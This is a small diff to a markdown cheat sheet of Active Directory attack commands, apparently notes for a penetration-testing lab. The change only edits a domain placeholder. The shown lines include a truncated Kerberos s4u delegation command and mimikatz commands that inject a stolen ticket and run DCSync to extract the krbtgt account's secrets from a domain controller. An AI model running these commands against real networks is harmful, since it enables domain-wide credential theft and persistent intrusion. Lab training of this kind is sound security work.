@@ -943,7 +943,7 @@ Tgs::s4u /tgt:<kirbi file> /user:<username>@<domain> /service:time/dcorp-dc.doll
 #### Using mimikatz to inject TGS ticket and executing DCsync
 ```
 Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
 ```
 
 ## DNS Admins
